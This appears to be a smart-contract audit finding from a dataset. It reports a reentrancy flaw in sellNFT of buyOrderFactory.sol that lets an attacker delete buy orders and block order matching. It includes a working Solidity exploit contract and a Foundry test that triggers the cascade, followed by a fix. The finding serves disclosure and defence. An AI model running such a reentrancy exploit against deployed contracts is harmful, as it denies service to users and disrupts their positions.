# [M] An attacker can wipe the order-

## Summary
Severity: Medium
Contest weight: 0.6635
Dataset id: 1837
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
A malicious actor can wipe the complete buy order orderbook in buyOrderFactory.sol.
The attack - excluding gas costs - does not bear any financial burden the attacker. As a result of the exploit, the orderbook will be temporarily inaccessible in the factory, leading to a DoS state in buy order matching, and in closing and selling existing positions.
The function sellNFT(uint receiptID) lacks reentrancy protection.

Internal pre-conditions
N/A
External pre-conditions
N/A
Attack Path
1. Attacker calls createBuyOrder(address _token, address wantedToken, uint _amount, uint ratio) with exploit contract supplied in parameter wantedToken
2. Attacker calls sellNFT(uint receiptID) which triggers the exploit sequence
3. Exploit contract will reenter sellNFT multiple times, triggering a cascade of buy order deletions
The orderbook in buyOrderFactory.sol will be inaccessible. The function getActiveBuyOrders(uint offset, uint limit) is used by off-chain services to gather buy order data - this data will be temporarily blocked. Deleting existing buy orders (deleteBuyOrder()) and selling NFTs (sellNFT(uint receiptID)) will also be temporarily blocked until the issue is resolved manually. Issue can be resolved manually by:
• Opening dummy buy orders with very little collateral
• Closing/selling positions on existing ”legit” orders

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface BuyOrder {
    function sellNFT(uint receiptID) external;
}
contract Exploit {
    BuyOrder public buyOrder;
    uint public counter = 0;
    uint public counterMax = 2;

    struct receiptInstance {
        uint receiptID;
        uint attachedNFT;
        uint lockedAmount;
        uint lockedDate;
        uint decimals;
        address vault;
        address underlying;
    }

    constructor() {}

    function setBuyOrder(address _buyOrder) public {
        buyOrder = BuyOrder(_buyOrder);
    }

    fallback() external payable {
        if (counter < 2) {
            counter++;
            buyOrder.sellNFT(0);
        }
        if (counter == counterMax) {
            counter++;
            buyOrder.sellNFT(1);
        }
    }

    function getDataByReceipt(uint receiptID) public view returns (receiptInstance memory) {
        uint lockedAmount;
        if (receiptID == 1) {
            lockedAmount = 1;
        } else {
            lockedAmount = 0;
        }
        uint lockedDate = 0;
        uint decimals = 0;
        address vault = address(this);
        address underlying = address(this);
        bool OwnerIsManager = true;
        return receiptInstance(receiptID, 0, lockedAmount, lockedDate, decimals, vault, underlying);
    }
}
```

```solidity
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "forge-std/StdCheats.sol";
import {BuyOrder, buyOrderFactory} from "@contracts/buyOrders/buyOrderFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import {Exploit} from "./exploit.sol";

contract BuyOrderTest is Test {
    buyOrderFactory public factory;
    BuyOrder public buyOrder;
    BuyOrder public buyOrderContract;
    ERC20Mock public AERO;
    Exploit public exploit;

    function setUp() public {
        BuyOrder instanceDeployment = new BuyOrder();
        factory = new buyOrderFactory(address(instanceDeployment));
        AERO = new ERC20Mock();
    }

    function testMultipleDeleteBuyOrder() public {
        address alice = makeAddr("alice");
        deal(address(AERO), alice, 1000e18, false);
        vm.startPrank(alice);
        IERC20(AERO).approve(address(factory), 1000e18);
        exploit = new Exploit();
        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        factory.createBuyOrder(address(AERO), address(AERO), 1, 1);
        address _buyOrderAddress = factory.createBuyOrder(
            address(AERO),
            address(exploit),
            1,
            1
        );
        exploit.setBuyOrder(_buyOrderAddress);
        buyOrderContract = BuyOrder(_buyOrderAddress);
        buyOrderContract.sellNFT(2);
        vm.stopPrank();
    }
}
```

## Recommendation
Apply reentrancy protection on the function sellNFT(uint receiptID).
